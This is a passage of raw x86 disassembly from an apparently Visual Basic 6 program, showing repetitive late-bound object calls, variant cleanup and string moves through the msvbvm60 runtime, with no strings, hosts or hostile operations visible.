008699AD: push eax
008699AE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008699B3: add esp, 00000010h
008699B6: push eax
008699B7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008699BC: push eax
008699BD: lea eax, var_44
008699C0: push eax
008699C1: call 00410A84h ; Set (object)
008699C6: push eax
008699C7: lea eax, var_7C
008699CA: push eax
008699CB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008699D0: add esp, 00000010h
008699D3: push eax
008699D4: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008699D9: mov var_00000128, eax
008699DF: mov var_00000130, 00000003h
008699E9: mov var_00000138, 00000001h
008699F3: mov var_00000140, 00000002h
008699FD: lea eax, var_00000120
00869A03: push eax
00869A04: lea eax, var_00000130
00869A0A: push eax
00869A0B: lea eax, var_00000140
00869A11: push eax
00869A12: lea eax, var_000001EC
00869A18: push eax
00869A19: lea eax, var_000001DC
00869A1F: push eax
00869A20: lea eax, var_24
00869A23: push eax
00869A24: call 00410A3Ch ; For
00869A29: mov var_00000200, eax
00869A2F: lea eax, var_44
00869A32: push eax
00869A33: lea eax, var_40
00869A36: push eax
00869A37: push 00000002h
00869A39: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869A3E: add esp, 0000000Ch
00869A41: lea eax, var_7C
00869A44: push eax
00869A45: lea eax, var_6C
00869A48: push eax
00869A49: push 00000002h
00869A4B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00869A50: add esp, 0000000Ch
00869A53: jmp 0086AD92h
00869A58: lea eax, var_24
00869A5B: mov var_00000118, eax
00869A61: mov var_00000120, 0000400Ch
00869A6B: cmp [008F2010h], 00000000h
00869A72: jnz 869A8Fh
00869A74: push 008F2010h
00869A79: push 00433984h
00869A7E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869A83: mov var_00000260, 008F2010h
00869A8D: jmp 869A99h
00869A8F: mov var_00000260, 008F2010h
00869A99: push 00000000h
00869A9B: push 00000004h
00869A9D: push 00440E58h
00869AA2: push 00000010h
00869AA4: pop eax
00869AA5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869AAA: lea esi, var_00000120
00869AB0: mov edi, esp
00869AB2: movsd 
00869AB3: movsd 
00869AB4: movsd 
00869AB5: movsd 
00869AB6: push 00000001h
00869AB8: push 00000000h
00869ABA: push 00440E48h
00869ABF: push 00000000h
00869AC1: push 00000018h
00869AC3: mov eax, var_00000260
00869AC9: mov eax, [eax]
00869ACB: mov ecx, var_00000260
00869AD1: mov ecx, [ecx]
00869AD3: mov ecx, [ecx]
00869AD5: push eax
00869AD6: call [ecx+00000550h]
00869ADC: push eax
00869ADD: lea eax, var_40
00869AE0: push eax
00869AE1: call 00410A84h ; Set (object)
00869AE6: push eax
00869AE7: lea eax, var_6C
00869AEA: push eax
00869AEB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869AF0: add esp, 00000010h
00869AF3: push eax
00869AF4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869AF9: push eax
00869AFA: lea eax, var_44
00869AFD: push eax
00869AFE: call 00410A84h ; Set (object)
00869B03: push eax
00869B04: lea eax, var_7C
00869B07: push eax
00869B08: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869B0D: add esp, 00000020h
00869B10: push eax
00869B11: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869B16: push eax
00869B17: lea eax, var_48
00869B1A: push eax
00869B1B: call 00410A84h ; Set (object)
00869B20: push eax
00869B21: lea eax, var_0000008C
00869B27: push eax
00869B28: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869B2D: add esp, 00000010h
00869B30: push eax
00869B31: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
00869B36: sub ax, FFFFh
00869B3A: neg ax
00869B3D: sbb eax, eax
00869B3F: inc eax
00869B40: neg eax
00869B42: mov var_0000019C, ax
00869B49: lea eax, var_48
00869B4C: push eax
00869B4D: lea eax, var_44
00869B50: push eax
00869B51: lea eax, var_40
00869B54: push eax
00869B55: push 00000003h
00869B57: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869B5C: add esp, 00000010h
00869B5F: lea eax, var_0000008C
00869B65: push eax
00869B66: lea eax, var_7C
00869B69: push eax
00869B6A: lea eax, var_6C
00869B6D: push eax
00869B6E: push 00000003h
00869B70: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00869B75: add esp, 00000010h
00869B78: movsx eax, word ptr var_0000019C
00869B7F: test eax, eax
00869B81: jz 0086AD75h
00869B87: mov eax, [ebp+08h]
00869B8A: mov eax, [eax]
00869B8C: push [ebp+08h]
00869B8F: call [eax+00000320h]
00869B95: push eax
00869B96: lea eax, var_000001AC
00869B9C: push eax
00869B9D: call 00410A84h ; Set (object)
00869BA2: mov var_00000138, 80020004h
00869BAC: mov var_00000140, 0000000Ah
00869BB6: lea eax, var_24
00869BB9: mov var_00000118, eax
00869BBF: mov var_00000120, 0000400Ch
00869BC9: cmp [008F2010h], 00000000h
00869BD0: jnz 869BEDh
00869BD2: push 008F2010h
00869BD7: push 00433984h
00869BDC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869BE1: mov var_00000264, 008F2010h
00869BEB: jmp 869BF7h
00869BED: mov var_00000264, 008F2010h
00869BF7: push 00000000h
00869BF9: push 00000014h
00869BFB: push 00440E58h
00869C00: push 00000010h
00869C02: pop eax
00869C03: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869C08: lea esi, var_00000120
00869C0E: mov edi, esp
00869C10: movsd 
00869C11: movsd 
00869C12: movsd 
00869C13: movsd 
00869C14: push 00000001h
00869C16: push 00000000h
00869C18: push 00440E48h
00869C1D: push 00000000h
00869C1F: push 00000018h
00869C21: mov eax, var_00000264
00869C27: mov eax, [eax]
00869C29: mov ecx, var_00000264
00869C2F: mov ecx, [ecx]
00869C31: mov ecx, [ecx]
00869C33: push eax
00869C34: call [ecx+00000550h]
00869C3A: push eax
00869C3B: lea eax, var_40
00869C3E: push eax
00869C3F: call 00410A84h ; Set (object)
00869C44: push eax
00869C45: lea eax, var_6C
00869C48: push eax
00869C49: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869C4E: add esp, 00000010h
00869C51: push eax
00869C52: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869C57: push eax
00869C58: lea eax, var_44
00869C5B: push eax
00869C5C: call 00410A84h ; Set (object)
00869C61: push eax
00869C62: lea eax, var_7C
00869C65: push eax
00869C66: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869C6B: add esp, 00000020h
00869C6E: push eax
00869C6F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869C74: push eax
00869C75: lea eax, var_48
00869C78: push eax
00869C79: call 00410A84h ; Set (object)
00869C7E: push eax
00869C7F: lea eax, var_0000008C
00869C85: push eax
00869C86: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869C8B: add esp, 00000010h
00869C8E: push eax
00869C8F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00869C94: mov var_000000D4, eax
00869C9A: mov var_000000DC, 00000008h
00869CA4: lea eax, var_24
00869CA7: mov var_00000128, eax
00869CAD: mov var_00000130, 0000400Ch
00869CB7: cmp [008F2010h], 00000000h
00869CBE: jnz 869CDBh
00869CC0: push 008F2010h
00869CC5: push 00433984h
00869CCA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869CCF: mov var_00000268, 008F2010h
00869CD9: jmp 869CE5h
00869CDB: mov var_00000268, 008F2010h
00869CE5: push 00000000h
00869CE7: push 00000000h
00869CE9: push 00440E58h
00869CEE: push 00000010h
00869CF0: pop eax
00869CF1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869CF6: lea esi, var_00000130
00869CFC: mov edi, esp
00869CFE: movsd 
00869CFF: movsd 
00869D00: movsd 
00869D01: movsd 
00869D02: push 00000001h
00869D04: push 00000000h
00869D06: push 00440E48h
00869D0B: push 00000000h
00869D0D: push 00000018h
00869D0F: mov eax, var_00000268
00869D15: mov eax, [eax]
00869D17: mov ecx, var_00000268
00869D1D: mov ecx, [ecx]
00869D1F: mov ecx, [ecx]
00869D21: push eax
00869D22: call [ecx+00000550h]
00869D28: push eax
00869D29: lea eax, var_4C
00869D2C: push eax
00869D2D: call 00410A84h ; Set (object)
00869D32: push eax
00869D33: lea eax, var_0000009C
00869D39: push eax
00869D3A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869D3F: add esp, 00000010h
00869D42: push eax
00869D43: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869D48: push eax
00869D49: lea eax, var_50
00869D4C: push eax
00869D4D: call 00410A84h ; Set (object)
00869D52: push eax
00869D53: lea eax, var_000000AC
00869D59: push eax
00869D5A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869D5F: add esp, 00000020h
00869D62: push eax
00869D63: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869D68: push eax
00869D69: lea eax, var_54
00869D6C: push eax
00869D6D: call 00410A84h ; Set (object)
00869D72: push eax
00869D73: lea eax, var_000000BC
00869D79: push eax
00869D7A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869D7F: add esp, 00000010h
00869D82: push eax
00869D83: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00869D88: mov var_000000E4, eax
00869D8E: mov var_000000EC, 00000008h
00869D98: push 00000010h
00869D9A: pop eax
00869D9B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869DA0: lea esi, var_00000140
00869DA6: mov edi, esp
00869DA8: movsd 
00869DA9: movsd 
00869DAA: movsd 
00869DAB: movsd 
00869DAC: push 00000010h
00869DAE: pop eax
00869DAF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869DB4: lea esi, var_000000DC
00869DBA: mov edi, esp
00869DBC: movsd 
00869DBD: movsd 
00869DBE: movsd 
00869DBF: movsd 
00869DC0: push 00000010h
00869DC2: pop eax
00869DC3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869DC8: lea esi, var_000000EC
00869DCE: mov edi, esp
00869DD0: movsd 
00869DD1: movsd 
00869DD2: movsd 
00869DD3: movsd 
00869DD4: push 00000003h
00869DD6: push 00000002h
00869DD8: push 00440E48h
00869DDD: push 00000000h
00869DDF: push 00000018h
00869DE1: push var_000001AC
00869DE7: lea eax, var_000000CC
00869DED: push eax
00869DEE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869DF3: add esp, 00000010h
00869DF6: push eax
00869DF7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869DFC: push eax
00869DFD: lea eax, var_58
00869E00: push eax
00869E01: call 00410A84h ; Set (object)
00869E06: push eax
00869E07: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00869E0C: add esp, 0000003Ch
00869E0F: lea eax, var_58
00869E12: push eax
00869E13: lea eax, var_54
00869E16: push eax
00869E17: lea eax, var_50
00869E1A: push eax
00869E1B: lea eax, var_4C
00869E1E: push eax
00869E1F: lea eax, var_48
00869E22: push eax
00869E23: lea eax, var_44
00869E26: push eax
00869E27: lea eax, var_40
00869E2A: push eax
00869E2B: push 00000007h
00869E2D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00869E32: add esp, 00000020h
00869E35: lea eax, var_000000EC
00869E3B: push eax
00869E3C: lea eax, var_000000DC
00869E42: push eax
00869E43: lea eax, var_000000CC
00869E49: push eax
00869E4A: lea eax, var_000000BC
00869E50: push eax
00869E51: lea eax, var_000000AC
00869E57: push eax
00869E58: lea eax, var_0000009C
00869E5E: push eax
00869E5F: lea eax, var_0000008C
00869E65: push eax
00869E66: lea eax, var_7C
00869E69: push eax
00869E6A: lea eax, var_6C
00869E6D: push eax
00869E6E: push 00000009h
00869E70: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00869E75: add esp, 00000028h
00869E78: mov var_00000168, 00000001h
00869E82: mov var_00000170, 00000003h
00869E8C: mov var_00000128, 00000001h
00869E96: mov var_00000130, 00000003h
00869EA0: lea eax, var_24
00869EA3: mov var_00000118, eax
00869EA9: mov var_00000120, 0000400Ch
00869EB3: cmp [008F2010h], 00000000h
00869EBA: jnz 869ED7h
00869EBC: push 008F2010h
00869EC1: push 00433984h
00869EC6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869ECB: mov var_0000026C, 008F2010h
00869ED5: jmp 869EE1h
00869ED7: mov var_0000026C, 008F2010h
00869EE1: push 00000010h
00869EE3: pop eax
00869EE4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869EE9: lea esi, var_00000130
00869EEF: mov edi, esp
00869EF1: movsd 
00869EF2: movsd 
00869EF3: movsd 
00869EF4: movsd 
00869EF5: push 00000001h
00869EF7: push 00000010h
00869EF9: push 00440E58h
00869EFE: push 00000010h
00869F00: pop eax
00869F01: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869F06: lea esi, var_00000120
00869F0C: mov edi, esp
00869F0E: movsd 
00869F0F: movsd 
00869F10: movsd 
00869F11: movsd 
00869F12: push 00000001h
00869F14: push 00000000h
00869F16: push 00440E48h
00869F1B: push 00000000h
00869F1D: push 00000018h
00869F1F: mov eax, var_0000026C
00869F25: mov eax, [eax]
00869F27: mov ecx, var_0000026C
00869F2D: mov ecx, [ecx]
00869F2F: mov ecx, [ecx]
00869F31: push eax
00869F32: call [ecx+00000550h]
00869F38: push eax
00869F39: lea eax, var_40
00869F3C: push eax
00869F3D: call 00410A84h ; Set (object)
00869F42: push eax
00869F43: lea eax, var_6C
00869F46: push eax
00869F47: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869F4C: add esp, 00000010h
00869F4F: push eax
00869F50: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869F55: push eax
00869F56: lea eax, var_44
00869F59: push eax
00869F5A: call 00410A84h ; Set (object)
00869F5F: push eax
00869F60: lea eax, var_7C
00869F63: push eax
00869F64: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869F69: add esp, 00000020h
00869F6C: push eax
00869F6D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
00869F72: push eax
00869F73: lea eax, var_48
00869F76: push eax
00869F77: call 00410A84h ; Set (object)
00869F7C: push eax
00869F7D: lea eax, var_0000008C
00869F83: push eax
00869F84: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00869F89: add esp, 00000020h
00869F8C: push eax
00869F8D: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
00869F92: mov var_000000F4, eax
00869F98: mov var_000000FC, 00000008h
00869FA2: lea eax, var_24
00869FA5: mov var_00000148, eax
00869FAB: mov var_00000150, 0000400Ch
00869FB5: cmp [008F2010h], 00000000h
00869FBC: jnz 869FD9h
00869FBE: push 008F2010h
00869FC3: push 00433984h
00869FC8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00869FCD: mov var_00000270, 008F2010h
00869FD7: jmp 869FE3h
00869FD9: mov var_00000270, 008F2010h
00869FE3: push 00000000h
00869FE5: push 00000014h
00869FE7: push 00440E58h
00869FEC: push 00000010h
00869FEE: pop eax
00869FEF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00869FF4: lea esi, var_00000150
00869FFA: mov edi, esp
00869FFC: movsd 
00869FFD: movsd 
00869FFE: movsd 
00869FFF: movsd 
0086A000: push 00000001h
0086A002: push 00000000h
0086A004: push 00440E48h
0086A009: push 00000000h
0086A00B: push 00000018h
0086A00D: mov eax, var_00000270
0086A013: mov eax, [eax]
0086A015: mov ecx, var_00000270
0086A01B: mov ecx, [ecx]
0086A01D: mov ecx, [ecx]
0086A01F: push eax
0086A020: call [ecx+00000550h]
0086A026: push eax
0086A027: lea eax, var_4C
0086A02A: push eax
0086A02B: call 00410A84h ; Set (object)
0086A030: push eax
0086A031: lea eax, var_0000009C
0086A037: push eax
0086A038: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A03D: add esp, 00000010h
0086A040: push eax
0086A041: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A046: push eax
0086A047: lea eax, var_50
0086A04A: push eax
0086A04B: call 00410A84h ; Set (object)
0086A050: push eax
0086A051: lea eax, var_000000AC
0086A057: push eax
0086A058: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A05D: add esp, 00000020h
0086A060: push eax
0086A061: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A066: push eax
0086A067: lea eax, var_54
0086A06A: push eax
0086A06B: call 00410A84h ; Set (object)
0086A070: push eax
0086A071: lea eax, var_000000BC
0086A077: push eax
0086A078: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A07D: add esp, 00000010h
0086A080: push eax
0086A081: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A086: mov var_000000D4, eax
0086A08C: mov var_000000DC, 00000008h
0086A096: push 00000010h
0086A098: pop eax
0086A099: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A09E: lea esi, var_00000170
0086A0A4: mov edi, esp
0086A0A6: movsd 
0086A0A7: movsd 
0086A0A8: movsd 
0086A0A9: movsd 
0086A0AA: push 00000010h
0086A0AC: pop eax
0086A0AD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A0B2: lea esi, var_000000FC
0086A0B8: mov edi, esp
0086A0BA: movsd 
0086A0BB: movsd 
0086A0BC: movsd 
0086A0BD: movsd 
0086A0BE: push 00000001h
0086A0C0: push 00000010h
0086A0C2: push 00440E58h
0086A0C7: push 00000010h
0086A0C9: pop eax
0086A0CA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A0CF: lea esi, var_000000DC
0086A0D5: mov edi, esp
0086A0D7: movsd 
0086A0D8: movsd 
0086A0D9: movsd 
0086A0DA: movsd 
0086A0DB: push 00000001h
0086A0DD: push 00000000h
0086A0DF: push 00440E48h
0086A0E4: push 00000000h
0086A0E6: push 00000018h
0086A0E8: push var_000001AC
0086A0EE: lea eax, var_000000CC
0086A0F4: push eax
0086A0F5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A0FA: add esp, 00000010h
0086A0FD: push eax
0086A0FE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A103: push eax
0086A104: lea eax, var_58
0086A107: push eax
0086A108: call 00410A84h ; Set (object)
0086A10D: push eax
0086A10E: lea eax, var_000000EC
0086A114: push eax
0086A115: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A11A: add esp, 00000020h
0086A11D: push eax
0086A11E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A123: push eax
0086A124: lea eax, var_5C
0086A127: push eax
0086A128: call 00410A84h ; Set (object)
0086A12D: push eax
0086A12E: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086A133: add esp, 0000002Ch
0086A136: lea eax, var_5C
0086A139: push eax
0086A13A: lea eax, var_58
0086A13D: push eax
0086A13E: lea eax, var_54
0086A141: push eax
0086A142: lea eax, var_50
0086A145: push eax
0086A146: lea eax, var_4C
0086A149: push eax
0086A14A: lea eax, var_48
0086A14D: push eax
0086A14E: lea eax, var_44
0086A151: push eax
0086A152: lea eax, var_40
0086A155: push eax
0086A156: push 00000008h
0086A158: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086A15D: add esp, 00000024h
0086A160: lea eax, var_000000FC
0086A166: push eax
0086A167: lea eax, var_000000EC
0086A16D: push eax
0086A16E: lea eax, var_000000DC
0086A174: push eax
0086A175: lea eax, var_000000CC
0086A17B: push eax
0086A17C: lea eax, var_000000BC
0086A182: push eax
0086A183: lea eax, var_000000AC
0086A189: push eax
0086A18A: lea eax, var_0000009C
0086A190: push eax
0086A191: lea eax, var_0000008C
0086A197: push eax
0086A198: lea eax, var_7C
0086A19B: push eax
0086A19C: lea eax, var_6C
0086A19F: push eax
0086A1A0: push 0000000Ah
0086A1A2: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086A1A7: add esp, 0000002Ch
0086A1AA: mov var_00000168, 00000002h
0086A1B4: mov var_00000170, 00000003h
0086A1BE: mov var_00000128, 00000002h
0086A1C8: mov var_00000130, 00000003h
0086A1D2: lea eax, var_24
0086A1D5: mov var_00000118, eax
0086A1DB: mov var_00000120, 0000400Ch
0086A1E5: cmp [008F2010h], 00000000h
0086A1EC: jnz 86A209h
0086A1EE: push 008F2010h
0086A1F3: push 00433984h
0086A1F8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A1FD: mov var_00000274, 008F2010h
0086A207: jmp 86A213h
0086A209: mov var_00000274, 008F2010h
0086A213: push 00000010h
0086A215: pop eax
0086A216: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A21B: lea esi, var_00000130
0086A221: mov edi, esp
0086A223: movsd 
0086A224: movsd 
0086A225: movsd 
0086A226: movsd 
0086A227: push 00000001h
0086A229: push 00000010h
0086A22B: push 00440E58h
0086A230: push 00000010h
0086A232: pop eax
0086A233: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A238: lea esi, var_00000120
0086A23E: mov edi, esp
0086A240: movsd 
0086A241: movsd 
0086A242: movsd 
0086A243: movsd 
0086A244: push 00000001h
0086A246: push 00000000h
0086A248: push 00440E48h
0086A24D: push 00000000h
0086A24F: push 00000018h
0086A251: mov eax, var_00000274
0086A257: mov eax, [eax]
0086A259: mov ecx, var_00000274
0086A25F: mov ecx, [ecx]
0086A261: mov ecx, [ecx]
0086A263: push eax
0086A264: call [ecx+00000550h]
0086A26A: push eax
0086A26B: lea eax, var_40
0086A26E: push eax
0086A26F: call 00410A84h ; Set (object)
0086A274: push eax
0086A275: lea eax, var_6C
0086A278: push eax
0086A279: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A27E: add esp, 00000010h
0086A281: push eax
0086A282: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A287: push eax
0086A288: lea eax, var_44
0086A28B: push eax
0086A28C: call 00410A84h ; Set (object)
0086A291: push eax
0086A292: lea eax, var_7C
0086A295: push eax
0086A296: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A29B: add esp, 00000020h
0086A29E: push eax
0086A29F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A2A4: push eax
0086A2A5: lea eax, var_48
0086A2A8: push eax
0086A2A9: call 00410A84h ; Set (object)
0086A2AE: push eax
0086A2AF: lea eax, var_0000008C
0086A2B5: push eax
0086A2B6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A2BB: add esp, 00000020h
0086A2BE: push eax
0086A2BF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A2C4: mov var_000000F4, eax
0086A2CA: mov var_000000FC, 00000008h
0086A2D4: lea eax, var_24
0086A2D7: mov var_00000148, eax
0086A2DD: mov var_00000150, 0000400Ch
0086A2E7: cmp [008F2010h], 00000000h
0086A2EE: jnz 86A30Bh
0086A2F0: push 008F2010h
0086A2F5: push 00433984h
0086A2FA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A2FF: mov var_00000278, 008F2010h
0086A309: jmp 86A315h
0086A30B: mov var_00000278, 008F2010h
0086A315: push 00000000h
0086A317: push 00000014h
0086A319: push 00440E58h
0086A31E: push 00000010h
0086A320: pop eax
0086A321: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A326: lea esi, var_00000150
0086A32C: mov edi, esp
0086A32E: movsd 
0086A32F: movsd 
0086A330: movsd 
0086A331: movsd 
0086A332: push 00000001h
0086A334: push 00000000h
0086A336: push 00440E48h
0086A33B: push 00000000h
0086A33D: push 00000018h
0086A33F: mov eax, var_00000278
0086A345: mov eax, [eax]
0086A347: mov ecx, var_00000278
0086A34D: mov ecx, [ecx]
0086A34F: mov ecx, [ecx]
0086A351: push eax
0086A352: call [ecx+00000550h]
0086A358: push eax
0086A359: lea eax, var_4C
0086A35C: push eax
0086A35D: call 00410A84h ; Set (object)
0086A362: push eax
0086A363: lea eax, var_0000009C
0086A369: push eax
0086A36A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A36F: add esp, 00000010h
0086A372: push eax
0086A373: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A378: push eax
0086A379: lea eax, var_50
0086A37C: push eax
0086A37D: call 00410A84h ; Set (object)
0086A382: push eax
0086A383: lea eax, var_000000AC
0086A389: push eax
0086A38A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A38F: add esp, 00000020h
0086A392: push eax
0086A393: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A398: push eax
0086A399: lea eax, var_54
0086A39C: push eax
0086A39D: call 00410A84h ; Set (object)
0086A3A2: push eax
0086A3A3: lea eax, var_000000BC
0086A3A9: push eax
0086A3AA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A3AF: add esp, 00000010h
0086A3B2: push eax
0086A3B3: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086A3B8: mov var_000000D4, eax
0086A3BE: mov var_000000DC, 00000008h
0086A3C8: push 00000010h
0086A3CA: pop eax
0086A3CB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A3D0: lea esi, var_00000170
0086A3D6: mov edi, esp
0086A3D8: movsd 
0086A3D9: movsd 
0086A3DA: movsd 
0086A3DB: movsd 
0086A3DC: push 00000010h
0086A3DE: pop eax
0086A3DF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A3E4: lea esi, var_000000FC
0086A3EA: mov edi, esp
0086A3EC: movsd 
0086A3ED: movsd 
0086A3EE: movsd 
0086A3EF: movsd 
0086A3F0: push 00000001h
0086A3F2: push 00000010h
0086A3F4: push 00440E58h
0086A3F9: push 00000010h
0086A3FB: pop eax
0086A3FC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A401: lea esi, var_000000DC
0086A407: mov edi, esp
0086A409: movsd 
0086A40A: movsd 
0086A40B: movsd 
0086A40C: movsd 
0086A40D: push 00000001h
0086A40F: push 00000000h
0086A411: push 00440E48h
0086A416: push 00000000h
0086A418: push 00000018h
0086A41A: push var_000001AC
0086A420: lea eax, var_000000CC
0086A426: push eax
0086A427: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A42C: add esp, 00000010h
0086A42F: push eax
0086A430: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A435: push eax
0086A436: lea eax, var_58
0086A439: push eax
0086A43A: call 00410A84h ; Set (object)
0086A43F: push eax
0086A440: lea eax, var_000000EC
0086A446: push eax
0086A447: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086A44C: add esp, 00000020h
0086A44F: push eax
0086A450: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086A455: push eax
0086A456: lea eax, var_5C
0086A459: push eax
0086A45A: call 00410A84h ; Set (object)
0086A45F: push eax
0086A460: call 0041095Eh ; msvbvm60.dll.__vbaLateIdCallSt
0086A465: add esp, 0000002Ch
0086A468: lea eax, var_5C
0086A46B: push eax
0086A46C: lea eax, var_58
0086A46F: push eax
0086A470: lea eax, var_54
0086A473: push eax
0086A474: lea eax, var_50
0086A477: push eax
0086A478: lea eax, var_4C
0086A47B: push eax
0086A47C: lea eax, var_48
0086A47F: push eax
0086A480: lea eax, var_44
0086A483: push eax
0086A484: lea eax, var_40
0086A487: push eax
0086A488: push 00000008h
0086A48A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086A48F: add esp, 00000024h
0086A492: lea eax, var_000000FC
0086A498: push eax
0086A499: lea eax, var_000000EC
0086A49F: push eax
0086A4A0: lea eax, var_000000DC
0086A4A6: push eax
0086A4A7: lea eax, var_000000CC
0086A4AD: push eax
0086A4AE: lea eax, var_000000BC
0086A4B4: push eax
0086A4B5: lea eax, var_000000AC
0086A4BB: push eax
0086A4BC: lea eax, var_0000009C
0086A4C2: push eax
0086A4C3: lea eax, var_0000008C
0086A4C9: push eax
0086A4CA: lea eax, var_7C
0086A4CD: push eax
0086A4CE: lea eax, var_6C
0086A4D1: push eax
0086A4D2: push 0000000Ah
0086A4D4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086A4D9: add esp, 0000002Ch
0086A4DC: mov var_00000168, 00000003h
0086A4E6: mov var_00000170, 00000003h
0086A4F0: mov var_00000128, 00000006h
0086A4FA: mov var_00000130, 00000003h
0086A504: lea eax, var_24
0086A507: mov var_00000118, eax
0086A50D: mov var_00000120, 0000400Ch
0086A517: cmp [008F2010h], 00000000h
0086A51E: jnz 86A53Bh
0086A520: push 008F2010h
0086A525: push 00433984h
0086A52A: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086A52F: mov var_0000027C, 008F2010h
0086A539: jmp 86A545h
0086A53B: mov var_0000027C, 008F2010h
0086A545: push 00000010h
0086A547: pop eax
0086A548: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A54D: lea esi, var_00000130
0086A553: mov edi, esp
0086A555: movsd 
0086A556: movsd 
0086A557: movsd 
0086A558: movsd 
0086A559: push 00000001h
0086A55B: push 00000010h
0086A55D: push 00440E58h
0086A562: push 00000010h
0086A564: pop eax
0086A565: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086A56A: lea esi, var_00000120
0086A570: mov edi, esp
0086A572: movsd 
0086A573: movsd 
0086A574: movsd 
0086A575: movsd 
0086A576: push 00000001h
0086A578: push 00000000h
0086A57A: push 00440E48h
0086A57F: push 00000000h
0086A581: push 00000018h
0086A583: mov eax, var_0000027C
